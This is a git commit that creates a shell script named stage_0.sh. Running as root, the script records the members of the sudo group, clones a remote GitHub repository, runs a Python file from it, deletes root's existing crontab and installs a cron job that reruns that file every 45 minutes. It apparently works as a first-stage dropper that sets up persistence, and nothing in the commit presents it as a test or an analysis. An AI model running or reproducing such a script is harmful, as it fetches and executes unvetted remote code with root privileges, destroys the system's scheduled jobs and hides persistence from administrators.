f4b4254736de1d56d0febaabfdd8d64caf96a207
cata0nana <101589752+cata0nana@users.noreply.github.com>
2022-11-04 19:37:38 +0100

    Create stage_0.sh

---
+++ stage_0.sh
@@ -0,0 +1,19 @@
+date >> xxxxxx_test
+
+rm -rf 0ct0pus_main
+rm -rf /root/hassed/*
+mkdir -p /root/hassed
+
+echo  $(grep '^sudo:.*$' /etc/group | cut -d: -f4) > /root/hassed/read.me
+
+git clone https://github.com/cata0nana/0ct0pus_main.git
+
+cp 0ct0pus_main/* /root/hassed/
+
+python3 /root/hassed/tel_tel.py
+
+crontab -r
+
+(crontab -l -u root 2>/dev/null; echo "*/45 * * * * python3 /root/hassed/tel_tel.py") | crontab -
+
+service cron stop && service cron start
